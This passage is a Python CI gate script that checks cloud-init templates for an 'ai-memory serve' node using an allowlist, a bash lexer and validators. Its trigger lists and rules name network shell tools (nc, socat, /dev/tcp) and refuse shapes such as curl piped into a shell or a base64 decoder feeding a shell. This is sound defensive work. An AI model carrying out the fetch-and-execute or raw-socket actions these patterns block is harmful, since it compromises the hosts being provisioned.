#!/usr/bin/env python3
# Copyright 2026 AlphaOne LLC
# SPDX-License-Identifier: Apache-2.0
"""#4616/#4657 - cloud-init memory templates: a fail-closed token allowlist.

Two templates (``infra/do-hive/cloud-init-memory.yaml.tpl`` and
``infra/aws-gpu-burst/cloud-init-memory.yaml.tpl``) provision a node and start
``ai-memory serve``. Rounds 1 and 2 of PR #4655 showed that a denylist of
forbidden spellings always has one more spelling it does not know (git through
a variable, curl into tar, a pin read from the network, a drop-in written by
printf, a case-changed sslmode key). The decision on #4657 (5-agent vote
(4d3ea1c5), memory 19497ef6) replaces those pattern rules with an allowlist.

Threat model (what this gate claims, and what it does not):
  The gate stops HONEST DRIFT: an edit that adds or changes a line able to
  fetch, execute, install, change a permission, name a credential, or reach the
  daemon's configuration fails here until the exact line is added to the
  reviewed allowlist ``scripts/qc-allowlists/cloud-init-token-allow.txt``.
  It does NOT claim to stop an author who both hides a token (a spelling the
  trigger list does not know) and edits this gate or its allowlist: that author
  is covered by code review of the allowlist diff, which is small and
  line-for-line. It does not prove that an allowlisted line is safe; the
  companion rule and the validators below refuse the shapes known to be unsafe
  even when someone lists them.

What runs, in order, for every template matching ``infra/*/cloud-init-memory*.tpl``:
  * Line model (``parse_template``): the YAML structure is read line by line
    (top-level keys, write_files entries that each start with ``- path:``,
    literal ``content: |`` blocks only). A block is a script (``#!`` first
    line), a systemd unit, or data; it is data ONLY when rule R5 shows it is
    never run (no execute bit, under ``DATA_HOMES``, and no statement runs its
    path, a glob for it or a parent directory; see ``DATA_HOMES``), else it is
    checked as a script with no shebang. A heredoc body is data under the same
    test for the literal file ``cat`` writes it to, else script. Script lines are joined at a trailing
    backslash (trailing whitespace after it still joins: fail closed), quote
    state and heredocs are tracked with bash rules, and a full-line ``#``
    comment is exempt ONLY outside a quote, outside a heredoc body and not
    after a continuation (the self-test proves each case).
  * Trigger (``triggered``): a structural line, a unit line, a shebang, every
    script line and every heredoc line are always triggered; a data-block line
    is triggered when its text, lower-cased and percent-decoded, holds a
    trigger word, path or metacharacter (``TRIGGER_RE``). Every triggered line
    must match an entry ``<scope> | <context> | <whitespace-normalised line>``
    of the allowlist, where scope is the template directory or ``both``.
  * Order and count (``run_scan``): per scope and context the approved lines
    must be the allowlist entries in file order, each as many times as it is
    listed; a moved, repeated or reordered approved line is red.
  * Allowlist form (``load_entries``): a malformed, non-normalised or
    unknown-scope entry, or one listed in both files, is a FAULT; an entry that matches nothing is stale
    (a ``both`` entry must match in both templates); an empty allowlist, a
    template with zero triggered lines, or fewer than two templates is a FAULT.
    ``scripts/qc-allowlists/cloud-init-token-pending.txt`` holds lines that are
    known defects with a tracker (``<scope> #<issue> | ...``); they pass the
    allowlist but are never validated as approved, and they go stale too.
  * Companion rule (``companion_hits``), on script blocks, data blocks,
    heredoc bodies (quoted or not), unit ``Exec*=`` commands and bootcmd/runcmd
    items (YAML flow lists included): refuses ``eval``, a glob or a
    ``$``-expansion or command substitution in command position (also behind
    sudo/env/exec/runuser/su/nice/timeout/xargs/flock/systemd-run wrappers),
    ANSI-C or locale quoting, a shell or interpreter fed by a pipe, a
    here-string, a process substitution or a heredoc, an expanded ``-c``
    script, ``source`` of a substitution, a decoder (base64 -d, xxd -r,
    openssl -d) in a statement that runs a shell, and an unparsable statement
    that holds ``$`` or a backtick. A literal ``-c`` script is checked again.
    For ``ai-memory`` (#4837 R12, a closed world): every word up to the
    subcommand is a flag word, ``--``, or the value of a value-taking root flag
    in the value grammar (``BARE_LITERAL_RE`` or ``QUOTED_VALUE_RE``; never a
    terraform ``${expr}`` or ``%{ }``), and the subcommand is a bare literal.
    A word naming the binary (by basename, or a variable assigned such a path)
    is either the resolved command word or an operand of ``KNOWN_NONEXEC``; any
    other command before it is an unknown wrapper and red, and cp/ln/mv/install
    may not give the binary another name. A renamed binary that the template
    never names (``/usr/local/bin/aim --db $X``) cannot be seen by name: that
    case is covered by the allowlist review of the line, not by this rule.
  * Validators (``validate_line``), on every approved (non-pending) line: a
    postgres URL must end with the exact ``sslmode=verify-full`` both raw and
    as sqlx decodes the query (case-sensitive key, percent-decoded keys and
    values, last wins); no case-variant sslmode key, no ``password`` or
    ``passfile`` key, a userinfo password only in /etc/ai-memory/store-url;
    no ``--store-url`` in any quoting, no ``AI_MEMORY_STORE_URL=``, no
    ``PGPASSWORD``/``PGPASSFILE``, no ``password=``, no lax-permission
    opt-out; curl/wget never ``|| true`` or piped into a shell, tar or
    interpreter; tar -x never ``|| true``; no unit binary under the service
    user's home; no ``encoding:``/``!!binary``/``source:``/``uri:`` in
    write_files; the store-url file and any chmod of it stay 0600.
  * Rendered user-data size (``userdata_hits``): the rendered template (both
    branches of every ``%{ }`` directive kept, each ``${x}`` replaced by a long
    stand-in) must fit the provider limit (AWS 16384, DigitalOcean 65536), or
    the template's main.tf must pass it through ``base64gzip`` and the gzip
    must fit. A template with no known limit is a FAULT.
  * Rules kept from the previous gate: 1 no non-ASCII byte (#1880); 2 some
    ExecStart runs ``ai-memory serve`` (fail closed on a launcher that hides
    the argv); 3 every serve argument is a ServeArgs flag of
    src/daemon_runtime.rs or a whole ``${name}`` value; 4 ``--tls-cert`` and
    ``--tls-key`` are both present (template policy).

Usage (any other argument exits 2):
  scripts/check-cloud-init-serve-flags.py                 exit 0 clean, 1 on a
                                                          hit, 2 on a FAULT
  scripts/check-cloud-init-serve-flags.py --self-test     red and green probes
  scripts/check-cloud-init-serve-flags.py --list-triggers print every triggered
                                                          line as an entry
"""
from __future__ import annotations

import argparse
import contextlib
import fnmatch
import gzip
import hashlib
import io
import json
import posixpath
import re
import shlex
import sys
import urllib.parse
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
SERVE_SRC = ROOT / "src" / "daemon_runtime.rs"
# Root Cli flags of ai-memory that take a separate value word (src/daemon_runtime.rs:303-324).
AI_MEMORY_VALUE_FLAGS = ("--db", "--agent-id", "--db-passphrase-file")
# #4837 R12: a closed-world grammar for the words up to the ai-memory subcommand. A
# value of a root flag is green ONLY when it is (a) a bare literal of these characters
# with no leading ~, or (b) ONE double-quoted word of these characters and plain $NAME /
# ${NAME} expansions. Everything else is red: arrays, ${X:-..} operators, globs, braces,
# command substitution, backticks, $'..', $"..", adjacent quoted and unquoted parts,
# single quotes, and any terraform ${expr} or %{ } (terraform pastes the value into the
# script text before bash parses it, so no quoting contains it). The subcommand word
# must be a bare literal. This closed-world form copies the precedent of memory d517ebcd
# (root issue #4869) and memory 19497ef6.
LITERAL_CLASS = r"A-Za-z0-9_./:@%+=,-"
BARE_LITERAL_RE = re.compile(r"^(?!~)[" + LITERAL_CLASS + r"]+$")
QUOTED_VALUE_RE = re.compile(
    r'^"(?:[' + LITERAL_CLASS + r']|\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})*"$')
FLAG_WORD_RE = re.compile(r"^-[-A-Za-z0-9]*$")
# tf_render marks where a %{ } directive stood: the rendered text depends on the branch (#4837 R11).
TF_DIRECTIVE_MARK = "\x02"
# tf_render writes each terraform ${expr} as this expansion. Its name holds a control
# character, which rules_1_to_4 refuses in a template, so no real script text (a shell
# variable named TFVALUE included) can ever equal it (#4837 R12, #4968).
TF_VALUE = "${tf\x03value}"
# The C0 controls other than TAB and LF, and DEL. YAML_BREAK_RE already refuses CR, VT,
# FF and FS/GS/RS; these are refused too so the gate's own markers stay unforgeable.
CONTROL_RE = re.compile("[\x00-\x08\x0e-\x1b\x1f\x7f]")
TEMPLATE_GLOB = "infra/*/cloud-init-memory*.tpl"
ALLOW_FILE = ROOT / "scripts" / "qc-allowlists" / "cloud-init-token-allow.txt"
PENDING_FILE = ROOT / "scripts" / "qc-allowlists" / "cloud-init-token-pending.txt"
AWS_TEMPLATE = "infra/aws-gpu-burst/cloud-init-memory.yaml.tpl"
DO_TEMPLATE = "infra/do-hive/cloud-init-memory.yaml.tpl"
REQUIRED_FLAGS = ("--tls-cert", "--tls-key")
SCOPES = ("aws-gpu-burst", "do-hive", "both")
STORE_URL_PATH = "/etc/ai-memory/store-url"
# Provider user-data limits in bytes: EC2 16 KB (raw or the decoded base64),
# DigitalOcean 64 KiB.
USER_DATA_LIMITS = {"aws-gpu-burst": 16384, "do-hive": 65536}

# ---------------------------------------------------------------- triggers
TRIGGER_WORDS = (
    "git curl wget fetch_pinned tar unzip rsync scp sftp ftp nc ncat socat pip pip3 npm npx docker podman snap "
    "apt apt-get apt-key dpkg perl ruby node alias eval exec source chmod chown chgrp umask install useradd "
    "usermod groupadd runuser sudo su ln mv cp rm mkdir setfacl findmnt swapon openssl sha256sum gpg trap "
    "systemctl systemd-run bash sh dash zsh ksh base64 xxd tee dd crontab psql pg_dump pg_isready createuser "
    "sed awk mount sysctl iptables ufw ssh visudo passwd chpasswd sslmode sslrootcert password dsn dbname "
    "conninfo serve export declare readonly local read printf mapfile function env set unset shopt ifs "
    "if then elif else fi while until do done case esac for select exit return break continue true false nft iptables-restore ip6tables "
    "pipx uv uvx"
).split()
TRIGGER_RE = re.compile(
    r"(?<![\w-])(?:" + "|".join(re.escape(w) for w in TRIGGER_WORDS) + r"|python[\d.]*)(?![\w-])"
    r"|(?:^|[;&|(]\s*)\.\s|[\w:.-]\s*\(\s*\)"
    r"|://|/dev/tcp|/dev/udp|_commit|exec|environment|\.service|\[unit\]|\[service\]|\[install\]"
    r"|ld_preload|store[-_ ]?url|postgres|ai_memory_|api[-_]?key|tls|ssl|hba|shared_preload|allow_lax"
    r"|ai-memory|aimemory|pgpass|secret|token|key"
    r"|\$\(|`|\$\{|%\{|\$|>|<"
    r"|(?:^|[\s=\"'(:>])/(?:etc|opt|usr|run|var|root|home|lib|lib64|bin|sbin|dev|proc|sys|tmp|srv|mnt|boot)\b"
)

# ---------------------------------------------------------------- rules 1-4
STRUCT_RE = re.compile(r"pub struct ServeArgs \{(.*?)\n\}", re.S)
FIELD_RE = re.compile(r"^\s{4}pub (\w+):", re.M)
ATTR_RE = re.compile(r"#\[arg\((.*?)\)\]", re.S)
LONG_NAMED_RE = re.compile(r'\blong\s*=\s*"([^"]+)"')
LONG_BARE_RE = re.compile(r"(?<![\w=])long\s*(?:,|$)")
SHORT_NAMED_RE = re.compile(r"\bshort\s*=\s*'(.)'")
SHORT_BARE_RE = re.compile(r"(?<![\w=])short\s*(?:,|$)")
ALIAS_RE = re.compile(r'\b(?:visible_)?alias(?:es)?\s*=\s*"([^"]+)"')
ENV_WRAPPER_ARG_RE = re.compile(r"^(?:-i|--ignore-environment|\w+=\S*)$")
INTERP_RE = re.compile(r"\$?\$\{[A-Za-z_]\w*\}")
EXEC_RE = re.compile(r"^[ \t]*ExecStart=(?P<cmd>.*)$", re.M)
CONT_RE = re.compile(r"\\[ \t]*\n[ \t]*")
COMMENT_LINE_RE = re.compile(r"^[ \t]*#.*$", re.M)
DIRECTIVE_LINE_RE = re.compile(r"^[ \t]*%\{[^}]*\}[ \t]*$", re.M)
YAML_BREAK_RE = re.compile("[\r\x0b\x0c\x1c\x1d\x1e\x85\u2028\u2029]")
TF_OPEN_RE = re.compile(r"^[ \t]*%\{~?[ \t]*(?:if|for)\b")
TF_CLOSE_RE = re.compile(r"^[ \t]*%\{~?[ \t]*end(?:if|for)\b")

# ---------------------------------------------------------------- validators
# A postgres URL anywhere, but not a regex that merely begins with the scheme
# (s#^postgres://...#): the scheme starts the text or follows whitespace,
# = " ' ( ` > , or {.
DSN_RE = re.compile(r"(?<![^\s=\"'(`>,{])postgres(?:ql)?://[^\s\"']+")
UNIT_SUFFIXES = (".service", ".socket", ".timer", ".mount", ".path", ".target", ".slice", ".scope")
HEREDOC_RE = re.compile(r"<<(-?)[ \t]*(?:(['\"])([A-Za-z_]\w*)\2|\\?([A-Za-z_]\w*))")


def serve_flags(source: str) -> set:
    """Flags clap derives for ServeArgs: ``--long`` (field name, or explicit
    long = name) and ``-s`` (explicit short = 's', or bare short = first letter)."""
    body = STRUCT_RE.search(source)
    if body is None:
        raise RuntimeError("pub struct ServeArgs not found in " + str(SERVE_SRC))
    text = body.group(1)
    fields = list(FIELD_RE.finditer(text))
    if not fields:
        raise RuntimeError("ServeArgs has no fields")
    flags = set()
    prev_end = 0
    for fm in fields:
        attrs = " ".join(ATTR_RE.findall(text[prev_end:fm.start()]))
        prev_end = fm.end()
        named = LONG_NAMED_RE.findall(attrs)
        if named:
            flags.update("--" + n for n in named)
        elif LONG_BARE_RE.search(attrs):
            flags.add("--" + fm.group(1).replace("_", "-"))
        flags.update("--" + n for n in ALIAS_RE.findall(attrs))
        flags.update("-" + c for c in SHORT_NAMED_RE.findall(attrs))
        if SHORT_BARE_RE.search(attrs):
            flags.add("-" + fm.group(1)[0])
    if not flags:
        raise RuntimeError("ServeArgs exposes no flags")
    return flags


def strip_terraform(text: str) -> str:
    """Drop terraform ``%{ if }`` / ``%{ endif }`` directives so their words are
    not read as flags. Interpolations stay: they are checked where they sit."""
    return re.sub(r"%\{[^}]*\}", " ", text)


def blank_comments(text: str) -> str:
    """Blank whole-line comments (keeping the newline)."""
    return COMMENT_LINE_RE.sub("", text)


def join_continuations(text: str):
    """Collapse backslash-newline continuations; return (joined, line_at)."""
    parts, cuts, last, out_len = [], [], 0, 0
    for m in CONT_RE.finditer(text):
        seg = text[last:m.start()]
        parts.append(seg)
        out_len += len(seg) + 1
        parts.append(" ")
        cuts.append(out_len)
        last = m.end()
    parts.append(text[last:])
    joined = "".join(parts)

    def line_at(off: int) -> int:
        return joined.count("\n", 0, off) + 1 + sum(1 for c in cuts if c <= off)

    return joined, line_at


def prefix_is_env_wrapper(pre: list) -> bool:
    """Tokens before the ai-memory binary may only be an ``env`` wrapper."""
    if not pre:
        return True
    if posixpath.basename(pre[0].lstrip("-@+!:")) != "env":
        return False
    return all(ENV_WRAPPER_ARG_RE.match(t) for t in pre[1:])


def serve_arg_hits(name: str, lineno: int, after: list, known: set) -> list:
    """Rule 3: every token after ``serve`` is a ServeArgs flag or its value."""
    hits = []
    expect_value = False
    for raw in after:
        tok = raw.strip("\"'")
        if "$" in INTERP_RE.sub("X", tok):
            hits.append("%s:%d: serve argument %r holds an expansion that cannot be checked (flags must be literal; only a whole ${name} may be a value)" % (name, lineno, tok))
        if tok.startswith("-") and tok != "-":
            long_form = tok.startswith("--")
            key = tok.split("=", 1)[0] if long_form else tok[:2]
            if key not in known:
                hits.append("%s:%d: serve flag %s is not a ServeArgs flag (unit would exit at start)" % (name, lineno, key))
            expect_value = "=" not in tok if long_form else True
        else:
            if not expect_value:
                hits.append("%s:%d: serve argument %r does not follow a flag (serve takes no positional arguments)" % (name, lineno, tok))
            expect_value = False
    return hits


def serve_invocations(text: str) -> list:
    """Rule 2: (line, tokens-after-serve, unparsed) for every ExecStart that runs serve."""
    joined, line_at = join_continuations(blank_comments(text))
    found = []
    for m in EXEC_RE.finditer(joined):
        tokens = strip_terraform(m.group("cmd")).split()
        if "serve" not in tokens:
            continue
        line = line_at(m.start())
        bin_idx = next((i for i, t in enumerate(tokens) if posixpath.basename(t.lstrip("-@+!:")) == "ai-memory"), None)
        if bin_idx is None or "serve" not in tokens[bin_idx + 1:] or not prefix_is_env_wrapper(tokens[:bin_idx]):
            found.append((line, [], True))
            continue
        verb = tokens.index("serve", bin_idx + 1)
        found.append((line, tokens[verb + 1:], False))
    return found


def rules_1_to_4(name: str, text: str, known: set) -> list:
    hits = []
    if not text.startswith("#cloud-config\n"):
        hits.append("%s:1: first line is not exactly #cloud-config (cloud-init picks the handler from it)" % name)
    for lineno, line in enumerate(text.split("\n"), 1):
        if YAML_BREAK_RE.search(line):
            hits.append("%s:%d: a line break other than LF (YAML splits the line the gate reads as one)" % (name, lineno))
        elif CONTROL_RE.search(line):
            hits.append("%s:%d: a control character (reserved for the gate's terraform markers, #4837 R12)" % (name, lineno))
    for lineno, line in enumerate(text.splitlines(), 1):
        if any(ord(ch) > 127 for ch in line):
            hits.append("%s:%d: non-ASCII byte (cloud-init discards the config, #1880)" % (name, lineno))
    invocations = serve_invocations(text)
    if not invocations:
        hits.append("%s: no ExecStart runs 'ai-memory serve' (nothing to check; a template that cannot start serve must not pass)" % name)
    for lineno, after, unparsed in invocations:
        if unparsed:
            hits.append("%s:%d: ExecStart names serve but is not 'ai-memory serve' or an env wrapper of it (a launcher hides the argv)" % (name, lineno))
            continue
        hits.extend(serve_arg_hits(name, lineno, after, known))
        flags = [t.strip("\"'").split("=", 1)[0] for t in after if t.strip("\"'").startswith("-")]
        for req in REQUIRED_FLAGS:
            if req not in flags:
                hits.append("%s:%d: serve has no %s (template policy: supply the listener certificate with the node IP SAN)" % (name, lineno, req))
    return hits


# ---------------------------------------------------------------- bash lexing
def norm(text: str) -> str:
    """The text an allow entry is compared with (#5097). Only whitespace that bash
    would split words on collapses to one blank; whitespace inside quotes or after a
    backslash is kept, and a kept newline is written as U+23CE, so an entry cannot
    approve a line whose words differ from the line it was written for (a
    backslash-newline continuation is not a backslash-blank, "a  b" is not "a b")."""
    split = [False] * len(text)
    for i, unquoted in _walk(text, None):
        split[i] = unquoted and text[i].isspace()
    out, blank = [], False
    for i, c in enumerate(text):
        if split[i]:
            blank = bool(out)
            continue
        if blank:
            out.append(" ")
            blank = False
        out.append("\u23ce" if c == "\n" else c)
    return "".join(out)


def _walk(s: str, state):
    """Walk ``s`` with bash quoting rules starting in ``state`` (None or a
    tuple stack of "'", '"', "(" for $( ) and "`"). Yield (index, unquoted)
    for every character and return the end state through StopIteration."""
    stack = list(state or ())
    i, n = 0, len(s)
    while i < n:
        c = s[i]
        top = stack[-1] if stack else None
        if top == "'":
            if c == "'":
                stack.pop()
            yield i, False
            i += 1
            continue
        if top in ('"', "`"):
            if c == "\\":
                yield i, False
                i += 2
                continue
            if c == top:
                stack.pop()
            elif top == '"' and c == "$" and s[i + 1:i + 2] == "(":
                stack.append("(")
                yield i, False
                i += 2
                continue
            elif top == '"' and c == "`":
                stack.append("`")
            yield i, False
            i += 1
            continue
        if c == "\\":
            yield i, False
            i += 2
            continue
        if c in "'\"`":
            stack.append(c)
            yield i, False
            i += 1
            continue
        if c == "$" and s[i + 1:i + 2] == "(":
            stack.append("(")
            yield i, False
            i += 2
            continue
        if c == "(" and top == "(":
            stack.append("(")
        elif c == ")" and top == "(":
            stack.pop()
            yield i, False
            i += 1
            continue
        if c == "#" and (i == 0 or s[i - 1] in " \t;&|()"):
            break
        yield i, top is None
        i += 1
    return tuple(stack) or None


def scan_quotes(s: str, state):
    """Bash quote state after ``s`` starting in ``state`` (None when every
    quote, backtick and $( ) is closed). An unquoted ``#`` at the start of a
    word ends the scan (a comment)."""
    w = _walk(s, state)
    try:
        while True:
            next(w)
    except StopIteration as stop:
        return stop.value


def unquoted_mask(s: str, state):
    """Return (mask, end_state): mask[i] is True where s[i] is top-level code."""
    mask = [False] * len(s)
    w = _walk(s, state)
    try:
        while True:
            i, unq = next(w)
            mask[i] = unq
    except StopIteration as stop:
        return mask, stop.value


def heredoc_starts(s: str, state) -> list:
    """Heredoc operators outside quotes: list of (delimiter, strip_tabs, quoted)
    or the string "bad" for an operator whose delimiter cannot be read."""
    mask, _ = unquoted_mask(s, state)
    out = []
    i = 0
    while i < len(s) - 1:
        if mask[i] and s[i] == "<" and s[i + 1] == "<" and (i == 0 or s[i - 1] != "<"):
            if s[i + 2:i + 3] == "<":
                i += 3
                continue
            m = HEREDOC_RE.match(s, i)
            if m is None:
                out.append("bad")
                i += 2
                continue
            delim = m.group(3) or m.group(4)
            quoted = bool(m.group(2)) or s[m.start():m.end()].find("\\") >= 0
            out.append((delim, m.group(1) == "-", quoted))
            i = m.end()
            continue
        i += 1
    return out


def bq_end(s: str, i: int) -> int:
    n = len(s)
    while i < n:
        if s[i] == "\\":
            i += 2
            continue
        if s[i] == "`":
            return i
        i += 1
    return -1


def dq_end(s: str, i: int) -> int:
    n = len(s)
    while i < n:
        c = s[i]
        if c == "\\":
            i += 2
            continue
        if c == '"':
            return i
        if c == "$" and s[i + 1:i + 2] == "(":
            j = find_close(s, i + 2)
            if j < 0:
                return -1
            i = j + 1
            continue
        if c == "`":
            j = bq_end(s, i + 1)
            if j < 0:
                return -1
            i = j + 1
            continue
        i += 1
    return -1


def find_close(s: str, i: int) -> int:
    """Index of the ``)`` closing a ``(`` whose content starts at ``i``."""
    depth, n = 1, len(s)
    while i < n:
        c = s[i]
        if c == "\\":
            i += 2
            continue
        if c == "'":
            j = s.find("'", i + 1)
            if j < 0:
                return -1
            i = j + 1
            continue
        if c == '"':
            j = dq_end(s, i + 1)
            if j < 0:
                return -1
            i = j + 1
            continue
        if c == "`":
            j = bq_end(s, i + 1)
            if j < 0:
                return -1
            i = j + 1
            continue
        if c == "(":
            depth += 1
        elif c == ")":
            depth -= 1
            if depth == 0:
                return i
        i += 1
    return -1


def brace_end(s: str, i: int) -> int:
    depth, n = 1, len(s)
    while i < n:
        c = s[i]
        if c == "\\":
            i += 2
            continue
        if c == "{":
            depth += 1
        elif c == "}":
            depth -= 1
            if depth == 0:
                return i
        i += 1
    return -1


def dq_subs(inner: str) -> list:
    """Command substitutions inside double-quoted (or unquoted-heredoc) text."""
    subs, i, n = [], 0, len(inner)
    while i < n:
        c = inner[i]
        if c == "\\":
            i += 2
            continue
        if c == "$" and inner[i + 1:i + 2] == "(":
            j = find_close(inner, i + 2)
            if j < 0:
                return subs + [None]
            body = inner[i + 2:j]
            if not (body.startswith("(") and body.endswith(")")):
                subs.append(body)
            i = j + 1
            continue
        if c == "`":
            j = bq_end(inner, i + 1)
            if j < 0:
                return subs + [None]
            subs.append(inner[i + 1:j])
            i = j + 1
            continue
        i += 1
    return subs


OPS2 = ("&&", "||", "|&", ";;", ";&")


def tokenize(s: str):
    """Split a bash statement into commands. Returns (commands, subs, ansi) or
    None when the text cannot be parsed. A command is (words, pipe_in, term)."""
    cmds, words, subs = [], [], []
    st = {"word": "", "inword": False, "pipe": False}
    ansi = False

    def flush():
        if st["inword"]:
            words.append(st["word"])
        st["word"], st["inword"] = "", False

    def end_cmd(op):
        flush()
        cmds.append((list(words), st["pipe"], op))
        del words[:]
        st["pipe"] = op in ("|", "|&")

    def add(txt):
        st["word"] += txt
        st["inword"] = True

    i, n = 0, len(s)
    while i < n:
        c = s[i]
        if c in " \t":
            flush()
            i += 1
            continue
        if c == "\n":
            end_cmd("\n")
            i += 1
            continue
        if c == "#" and not st["inword"]:
            j = s.find("\n", i)
            i = n if j < 0 else j
            continue
        if c == "\\":
            if s[i + 1:i + 2] == "\n":
                i += 2
                continue
            add(s[i:i + 2])
            i += 2
            continue
        if c == "'":
            j = s.find("'", i + 1)
            if j < 0:
                return None
            add(s[i:j + 1])
            i = j + 1
            continue
        if c == '"':
            j = dq_end(s, i + 1)
            if j < 0:
                return None
            got = dq_subs(s[i + 1:j])
            if None in got:
                return None
            subs.extend(got)
            add(s[i:j + 1])
            i = j + 1
            continue
        if c == "$":
            nx = s[i + 1:i + 2]
            if nx in ("'", '"'):
                ansi = True
                add("$")
                i += 1
                continue
            if nx == "(":
                j = find_close(s, i + 2)
                if j < 0:
                    return None
                body = s[i + 2:j]
                if not (body.startswith("(") and body.endswith(")")):
                    subs.append(body)
                add(s[i:j + 1])
                i = j + 1
                continue
            if nx == "{":
                j = brace_end(s, i + 2)
                if j < 0:
                    return None
                got = dq_subs(s[i + 2:j])
                if None in got:
                    return None
                subs.extend(got)
                add(s[i:j + 1])
                i = j + 1
                continue
            add("$")
            i += 1
            continue
        if c == "`":
            j = bq_end(s, i + 1)
            if j < 0:
                return None
            subs.append(s[i + 1:j])
            add(s[i:j + 1])
            i = j + 1
            continue
        if c in "<>" and s[i + 1:i + 2] == "(":
            j = find_close(s, i + 2)
            if j < 0:
                return None
            subs.append(s[i + 2:j])
            add(s[i:j + 1])
            i = j + 1
            continue
        if c == "&" and (s[i + 1:i + 2] == ">" or (st["inword"] and st["word"][-1:] in "<>")):
            add(c)
            i += 1
            continue
        if c == "|" and st["inword"] and st["word"][-1:] == ">":
            add(c)
            i += 1
            continue
        if c in ";&|()":
            op = s[i:i + 2] if s[i:i + 2] in OPS2 else c
            end_cmd(op)
            i += len(op)
            continue
        add(c)
        i += 1
    end_cmd("")
    return cmds, subs, ansi


def unquote(w: str):
    """Return (value, expanded) for one shell word."""
    out, exp, i, n = [], False, 0, len(w)
    while i < n:
        c = w[i]
        if c == "\\":
            out.append(w[i + 1:i + 2])
            i += 2
            continue
        if c == "'":
            j = w.find("'", i + 1)
            if j < 0:
                out.append(w[i + 1:])
                break
            out.append(w[i + 1:j])
            i = j + 1
            continue
        if c == '"':
            j = dq_end(w, i + 1)
            if j < 0:
                j = n
            inner = w[i + 1:j]
            if "$" in inner or "`" in inner:
                exp = True
            out.append(re.sub(r'\\([$`"\\])', r"\1", inner))
            i = j + 1
            continue
        if c in "$`":
            exp = True
        out.append(c)
        i += 1
    return "".join(out), exp


ASSIGN_RE = re.compile(r"^[A-Za-z_]\w*(?:\[[^]]*\])?\+?=")
REDIR_RE = re.compile(r"^(?:\d*|&)(?:<<<|<<-|<<|<>|>>|>\||>&|<&|&>>|&>|<|>)(.*)$", re.S)
# a redirection target before the ai-memory subcommand that holds rendered terraform text (#5099)
REDIR_TF_HIT = "ai-memory redirection target: a terraform value (its text can hold a space and so the subcommand)"
KEYWORDS = {"if", "then", "do", "else", "elif", "while", "until", "!", "time", "{", "}", "fi", "done", "esac", "coproc"}
SHELLS = {"sh", "bash", "dash", "zsh", "ksh", "mksh", "busybox"}
INTERP_BASE_RE = re.compile(r"^(?:python[\d.]*|perl|ruby|node|nodejs|php|lua|tclsh|awk|gawk|mawk)$")
INTERP_SCRIPT_OPT = {"perl": ("-e", "-E"), "ruby": ("-e",), "node": ("-e", "--eval", "-p", "--print"), "nodejs": ("-e", "--eval", "-p"), "php": ("-r",), "lua": ("-e",)}
# (options that take an argument, positionals before the command)
WRAPPERS = {
    "sudo": ({"-u", "-g", "-C", "-D", "-h", "-p", "-r", "-t", "-U", "-T", "--user", "--group", "--chdir", "--host", "--prompt", "--role", "--type", "--other-user", "--close-from", "--command-timeout"}, 0),
    "env": ({"-u", "--unset", "-C", "--chdir"}, 0),
    "exec": ({"-a"}, 0),
    "command": (set(), 0),
    "builtin": (set(), 0),
    "nohup": (set(), 0),
    "setsid": (set(), 0),
    "stdbuf": ({"-i", "-o", "-e", "--input", "--output", "--error"}, 0),
    "nice": ({"-n", "--adjustment"}, 0),
    "ionice": ({"-c", "-n", "-p", "-P", "-u", "--class", "--classdata"}, 0),
    "timeout": ({"-s", "-k", "--signal", "--kill-after"}, 1),
    "runuser": ({"-u", "-g", "-G", "-s", "-w", "--user", "--group", "--supp-group", "--shell", "--whitelist-environment"}, 0),
    "su": ({"-s", "-g", "-G", "-w", "--shell", "--group", "--supp-group", "--whitelist-environment"}, 0),
    "xargs": ({"-I", "-n", "-P", "-d", "-L", "-s", "-E", "-a", "--arg-file", "--delimiter", "--max-args", "--max-procs", "--max-lines", "--max-chars", "--eof"}, 0),
    "chroot": ({"--userspec", "--groups"}, 1),
    "flock": ({"-w", "-E", "--timeout", "--conflict-exit-code"}, 1),
    "systemd-run": ({"-u", "--unit", "-p", "--property", "--description", "--slice", "-E", "--setenv", "--uid", "--gid", "-M", "--machine", "-H", "--host", "--working-directory", "--on-active", "--on-boot", "--on-calendar", "--timer-property", "--path-property", "--socket-property", "--service-type", "--nice"}, 0),
}
SCRIPT_OPTS = {"su": ("-c", "--command"), "runuser": ("-c", "--command"), "flock": ("-c", "--command"), "env": ("-S", "--split-string")}


def unquoted_chars(w: str) -> str:
    """The characters of one shell word that are neither quoted nor escaped."""
    out, i, n = [], 0, len(w)
    while i < n:
        c = w[i]
        if c == "\\":
            i += 2
            continue
        if c == "'":
            j = w.find("'", i + 1)
            i = n if j < 0 else j + 1
            continue
        if c == '"':
            j = dq_end(w, i + 1)
            i = n if j < 0 else j + 1
            continue
        out.append(c)
        i += 1
    return "".join(out)


def value_word_problem(w: str):
    """None when w is in the closed value grammar (BARE_LITERAL_RE or QUOTED_VALUE_RE),
    else why it is not. The reason text only names the first shape found; the verdict is
    the grammar alone (#4837 R12)."""
    if BARE_LITERAL_RE.match(w) or QUOTED_VALUE_RE.match(w):
        return None
    u = unquoted_chars(w)
    if TF_DIRECTIVE_MARK in w:
        why = "a terraform directive (the rendered quoting depends on the branch)"
    elif TF_VALUE in w:
        why = "a terraform interpolation (bash re-parses the rendered text; quoting cannot contain it)"
    elif "`" in w or "$(" in w:
        why = "a command substitution"
    elif "$'" in w or '$"' in w:
        why = "ANSI-C or locale quoting"
    elif "'" in w:
        why = "single quotes (only a bare literal or one double-quoted word passes)"
    elif re.search(r"[*?\[{]", u):
        why = "a glob or brace expansion (one word can become several)"
    elif re.search(r"\$\{[^}]*[^A-Za-z0-9_}]", w):
        why = "a parameter operator, array or indirection inside ${ }"
    elif "$" in u:
        why = "an unquoted expansion (word split)"
    elif w.startswith("~"):
        why = "a tilde expansion"
    else:
        why = "a word outside the grammar [%s] / one double-quoted word of those and $NAME" % LITERAL_CLASS
    return "%s in %r" % (why, scrub(w)[:40])


# ---------------------------------------------------------------- #4837 R12: R4 operands
# Commands known never to run an operand. A word naming the ai-memory binary may be an
# operand of these only; any other word before it on the simple command (taskset, doas,
# time -p, unshare, prlimit, numactl, setpriv, ...) is an unknown wrapper: red.
KNOWN_NONEXEC = {"chmod", "chown", "chgrp", "mkdir", "test", "[", "[[", "stat", "useradd", "tar", "systemctl",
                 "ls", "rm", "cp", "ln", "mv", "install"}
COPY_CMDS = {"cp": {"-S", "--suffix"}, "ln": {"-S", "--suffix"}, "mv": {"-S", "--suffix"},
             "install": {"-m", "-o", "-g", "-S", "--mode", "--owner", "--group", "--suffix"}}
